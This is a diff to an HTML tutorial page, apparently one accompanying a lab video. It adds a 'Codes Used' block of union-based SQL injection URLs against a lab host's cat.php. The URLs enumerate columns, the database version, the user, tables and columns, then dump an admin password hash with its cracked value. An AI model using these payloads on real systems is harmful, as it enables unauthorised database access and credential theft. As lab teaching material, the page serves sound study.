@@ -20,6 +20,7 @@
     <!-- HandDrawn Button CSS -->
     <!-- <link rel="stylesheet" href="css/button/normalize.css"> -->
     <link rel="stylesheet" href="../../css/button/style.css">
+    <link rel="stylesheet" href="../../cheat-assets/plugins/prism/prism.css">
 
     <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -86,6 +87,31 @@
                     <!-- Your browser does not support the video tag. -->
                 </video>
             </div>
+            <div class="block">
+                <h3 class="sub-title text-center">Codes Used</h3>
+                <div class="code-block">
+                    <pre><code class="language-markup">
+http://192.168.216.136/cat.php?id=1'
+http://192.168.216.136/cat.php?id=1 order by 1
+http://192.168.216.136/cat.php?id=1 order by 2
+http://192.168.216.136/cat.php?id=1 order by 3
+http://192.168.216.136/cat.php?id=1 order by 4
+http://192.168.216.136/cat.php?id=1 order by 5 (error)
+
+http://192.168.216.136/cat.php?id=-1 union select 1,2,3,4
+http://192.168.216.136/cat.php?id=-1 union select 1,@@version,3,4
+http://192.168.216.136/cat.php?id=-1 union select 1,user(),3,4
+http://192.168.216.136/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables
+http://192.168.216.136/cat.php?id=-1 union select 1,column_name,3,4 from information_schema.columns where table_name='users'
+http://192.168.216.136/cat.php?id=-1 union select 1,concat(id,0x3a,login,0x3a,password),3,4 from users
+
+1:admin:8efe310f9ab3efeae8d410a8e0166eb2
+P4ssw0rd
+
+
+                    </code></pre>
+                </div><!--//code-block-->
+            </div><!--//block-->
         </div>
 
         <!-- Footer -->
@@ -108,6 +134,8 @@
 
     <!-- Bootstrap Core JavaScript -->
     <script src="../../js/bootstrap.min.js"></script>
+
+    <script type="text/javascript" src="../../cheat-assets/plugins/prism/prism.js"></script>
 
 </body>
 
